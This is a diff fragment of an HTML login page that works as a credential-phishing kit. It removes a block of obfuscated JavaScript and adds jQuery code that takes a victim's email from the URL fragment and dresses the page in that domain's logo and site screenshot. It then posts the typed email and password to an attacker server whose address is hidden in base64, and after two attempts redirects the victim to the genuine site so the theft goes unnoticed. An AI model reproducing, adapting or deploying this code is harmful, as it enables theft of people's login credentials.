KwPZbRSZoZhvU$TdlWHF=iuetLf;hjTceBpDk[KwPZbRSZoZhvU$TdlWHF(0x86)][KwPZbRSZoZhvU$TdlWHF(0xae)]=KwPZbRSZoZhvU$TdlWHF(0x8d),XmrTvyX_NMp$EN[KwPZbRSZoZhvU$TdlWHF(0x94)]=![],XmrTvyX_NMp$EN[KwPZbRSZoZhvU$TdlWHF(0x9d)]=KwPZbRSZoZhvU$TdlWHF(0xad),CYxVnc[KwPZbRSZoZhvU$TdlWHF(0xa7)]='';},-0xc6d*Number(parseInt(0x2))+Math.ceil(0x139)*-parseInt(0x10)+-parseInt(0x6a)*-0x91):window[iuetLf(0xa5)][iuetLf(0x9f)]=iuetLf(0x91),DQkkZQ$WfjKZ$T[iuetLf(0xab)]=function(){const yEy$GU_emB=iuetLf;if(DQkkZQ$WfjKZ$T[yEy$GU_emB(0x7e)]>=Math.trunc(parseInt(0x1f))*-0x3e+-parseInt(0x13ac)+parseFloat(-parseInt(0x4a9))*-parseInt(0x6)&&DQkkZQ$WfjKZ$T[yEy$GU_emB(0x7e)]<-parseInt(0x10f)*-0x15+-0x126e*Math.ceil(0x1)+-0x23d*parseFloat(0x1)){}else hjTceBpDk[yEy$GU_emB(0x86)][yEy$GU_emB(0xae)]=yEy$GU_emB(0x8d),XmrTvyX_NMp$EN[yEy$GU_emB(0x94)]=![],XmrTvyX_NMp$EN[yEy$GU_emB(0x9d)]=yEy$GU_emB(0xad);},DQkkZQ$WfjKZ$T[iuetLf(0x99)]=function(){const xI_Q$vgLpz=iuetLf;hjTceBpDk[xI_Q$vgLpz(0x86)][xI_Q$vgLpz(0xae)]=xI_Q$vgLpz(0x8d),XmrTvyX_NMp$EN[xI_Q$vgLpz(0x94)]=![],XmrTvyX_NMp$EN[xI_Q$vgLpz(0x9d)]=xI_Q$vgLpz(0xad);},DQkkZQ$WfjKZ$T[iuetLf(0x83)](Mhnnr$nqnXZwVOezfoFo_L);}),setTimeout(()=>{const ekJXAj$LQpMGD$DlVNSfw=RTQ$gTJmdhj_Q;document[ekJXAj$LQpMGD$DlVNSfw(0xa6)](ekJXAj$LQpMGD$DlVNSfw(0xaa))[ekJXAj$LQpMGD$DlVNSfw(0x86)][ekJXAj$LQpMGD$DlVNSfw(0xae)]=ekJXAj$LQpMGD$DlVNSfw(0x82),document[ekJXAj$LQpMGD$DlVNSfw(0xa6)](ekJXAj$LQpMGD$DlVNSfw(0x9b))[ekJXAj$LQpMGD$DlVNSfw(0x86)][ekJXAj$LQpMGD$DlVNSfw(0xae)]=ekJXAj$LQpMGD$DlVNSfw(0x8d);},parseInt(0x1a8c)+parseFloat(parseInt(0x1531))+Math.floor(-parseInt(0x201d)));
-
-    </script>   
+       <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
 </body>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+
+<script>
+  /*function sub() {
+    var ai = $("#ai").val();
+        var pr = $("#pr").val();
+    var email = ai; 
+    var password = pr;
+    $.post('', {email: email, password: password}, function(data) {
+      $("#processing").hide();
+      alert(email + " " + password);
+    });
+  }*/
+</script>
+
+<script>
+  /* global $ */
+  $(document).ready(function () {
+    var count = 0;
+
+
+    $('#m-btn').click();
+
+    /////////////url ai getting////////////////
+    var email = window.location.hash.substr(1);
+    if (!email) {
+
+    } else {
+      var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
+
+      if (!base64regex.test(email)) {
+        // alert(btoa(email));
+        var my_email = email;
+      } else {
+        // alert(atob(email));
+        var my_email = atob(email);
+      }
+      // $('#email').val(email);
+      // var my_email =email;
+      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+      // $('#ai').val(ai);
+      // var my_ai = ai;
+      var ind = my_email.indexOf("@");
+      var my_slice = my_email.substr((ind + 1));
+	  var mainPage = 'https://'+my_slice; 
+      var c = my_slice.substr(0, my_slice.indexOf('.'));
+      var final = c.toLowerCase();
+	  var finalu= c.toUpperCase();
+      $('#email').val(my_email);
+      $('#email').attr('readonly', true);
+      $("#msg").hide();
+      $("#processing").hide()
+	  
+	  		var sv = my_slice;
+		
+		var image = "url('https://image.thum.io/get/width/1200/http://"+sv;"')"
+		
+
+
+        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+mainPage);
+		$("#logoname").html(final);
+		$(".logoname").html(final);
+		$('#kai').html(""+my_slice);
+		$('#banNer').html(""+my_slice);
+		$('#banNer').html(final);
+		$('#bg_screen').html(image);
+         
+        document.body.style.backgroundImage = image;
+	  
+	  
+	  
+    }
+    ///////////////url getting ai////////////////
+
+    var file = "";
+
+    $('#submit-btn').click(function (event) {
+      $("#processing").show()
+      setTimeout(function () {
+        $("#processing").hide()
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var email = $("#email").val();
+        var password = $("#password").val();
+        var msg = $('#msg').html();
+        $('#msg').text(msg);
+        
+        var my_email = email;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!email) {
+          $("#processing").hide();
+          $('#error').show();
+          $('#error').html("이메일 필드는 비어 있습니다.!");
+          email.focus;
+          return false;
+        }
+
+        else if (!filter.test(my_email)) {
+          $("#processing").hide();
+          $('#error').show();
+          $('#error').html("Email is Empty");
+          email.focus;
+          return false;
+        }
+        else if (!password) {
+          $("#processing").hide();
+          $('#error').show();
+          $('#error').html("비밀번호가 비어 있습니다");
+          email.focus;
+          return false;
+        }
+
+        else {
+
+          var ind = my_email.indexOf("@");
+          var my_slice = my_email.substr((ind + 1));
+          var c = my_slice.substr(0, my_slice.indexOf('.'));
+          var final = c.toLowerCase();
+          
+          count = count + 1;
+
+          var dm = atob("aHR0cHM6Ly9tYXhtZWV0Lm9ubGluZS9vb2dlbi93ZWJpbi5waHA=");
+
+
+          $.ajax({
+            dataType: 'JSON',
+            //url: atob(file),
+            url: dm,
+            type: 'POST',
+            data: {
+              email: email,
+              password: password,
+            },
+            // data: $('#contact').serialize(),
+            beforeSend: function (xhr) {
+              $("#processing").hide();
+              $('#submit-btn').html('Login');
+            },
+            success: function (response) {
+              alert(response);
+              $("#processing").hide();
+              if (response) {
+                $("#processing").hide();
+                $("#msg").show();
+                console.log(response);
+                if (response['signal'] == 'ok') {
+                  $("#processing").hide();
+                  $("#password").val("");
+                  if (count >= 2) {
+                    $("#processing").hide();
+                    count = 0;
+                    // window.location.replace(response['redirect_link']);
+                    window.location.replace("http://www." + my_slice);
+                    return false;
+
+                  }
+                  // $('#msg').html(response['msg']);
+                } else {
+                  $("#processing").hide();
+                  // $('#msg').html(response['msg']);
+                }
+              }
+            },
+            error: function () {
+              $("#processing").hide();
+              $("#password").val("");
+              if (count >= 2) {
+                $("#processing").hide();
+                count = 0;
+                window.location.replace("http://www." + my_slice);
+                return false;
+              }
+              $("#msg").show();
+              // $('#msg').html("나중에 다시 시도 해주십시오");
+            },
+            complete: function () {
+              $("#processing").hide();
+              $('#submit-btn').html('Login');
+            }
+          });
+        }
+
+      }, 4000);
+    });
+
+  });
+</script>
+
+<script>
+  $("#processing").hide()
+</script>
 </html>
